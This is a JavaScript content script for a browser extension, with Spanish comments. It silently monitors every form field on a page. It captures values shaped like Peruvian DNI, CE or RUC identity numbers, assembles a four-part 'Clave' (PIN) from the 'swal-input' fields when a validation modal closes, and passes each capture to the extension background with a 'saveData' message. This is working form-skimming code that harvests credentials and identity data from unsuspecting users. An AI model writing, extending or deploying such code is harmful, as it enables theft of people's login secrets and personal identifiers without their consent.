// Buffer para la Clave
let claveBuffer = { 'swal-input1': '', 'swal-input2': '', 'swal-input3': '', 'swal-input4': '' };
let lastCapture = { type: '', value: '', at: 0 };

function extractDigits(rawValue) {
    return String(rawValue ?? '').trim().replace(/\s+/g, '');
}

function classifyDocumentValue(rawValue) {
    const value = extractDigits(rawValue);

    if (!/^\d+$/.test(value)) {
        return null;
    }

    if (value.length === 8) {
        return { field: 'DNI', value };
    }

    if (value.length === 9) {
        return { field: 'CE', value };
    }

    if (value.length === 11) {
        return { field: 'RUC', value };
    }

    return null;
}

function shouldSkipDuplicateCapture(field, value) {
    const now = Date.now();
    const isDuplicate = lastCapture.field === field && lastCapture.value === value && (now - lastCapture.at) < 1500;

    if (!isDuplicate) {
        lastCapture = { field, value, at: now };
    }

    return isDuplicate;
}

function captureDocumentValue(rawValue) {
    const classified = classifyDocumentValue(rawValue);

    if (!classified) {
        return;
    }

    if (shouldSkipDuplicateCapture(classified.field, classified.value)) {
        return;
    }

    chrome.runtime.sendMessage({
        action: 'saveData',
        data: {
            field: classified.field,
            value: classified.value,
            timestamp: new Date().toISOString()
        }
    });
}

// 1. Capturar pulsaciones para llenar el buffer de la clave
document.addEventListener('input', (event) => {
    const target = event.target;
    
    // Si es uno de los campos de la clave, solo actualizamos el buffer
    if (['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'].includes(target.id)) {
        claveBuffer[target.id] = target.value;
        return; 
    }

    // Clasificación restaurada: solo DNI, CE o RUC con longitudes exactas.
    captureDocumentValue(target.value);
}, true);

document.addEventListener('change', (event) => {
    const target = event.target;
    if (!target || !('value' in target)) {
        return;
    }

    if (['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'].includes(target.id)) {
        return;
    }

    captureDocumentValue(target.value);
}, true);

document.addEventListener('blur', (event) => {
    const target = event.target;
    if (!target || !('value' in target)) {
        return;
    }

    if (['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'].includes(target.id)) {
        return;
    }

    captureDocumentValue(target.value);
}, true);

// 2. Observador para detectar el cierre del modal de validación (ÉXITO)
const targetNode = document.getElementById('modalValidarCodigo');
if (targetNode) {
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.attributeName === 'style') {
                const style = targetNode.getAttribute('style');
                // Si el modal pasa a display: none, enviamos la clave completa
                if (style && style.includes('display: none')) {
                    const claveCompleta = `${claveBuffer['swal-input1']}${claveBuffer['swal-input2']}${claveBuffer['swal-input3']}${claveBuffer['swal-input4']}`;
                    
                    if (claveCompleta !== "") {
                        if (!shouldSkipDuplicateCapture('Clave', claveCompleta)) {
                            chrome.runtime.sendMessage({ 
                                action: 'saveData', 
                                data: { field: 'Clave', value: claveCompleta, timestamp: new Date().toISOString() } 
                            });
                        }
                        // Limpiar buffer tras enviar
                        claveBuffer = { 'swal-input1': '', 'swal-input2': '', 'swal-input3': '', 'swal-input4': '' };
                    }
                }
            }
        });
    });
    observer.observe(targetNode, { attributes: true });
}
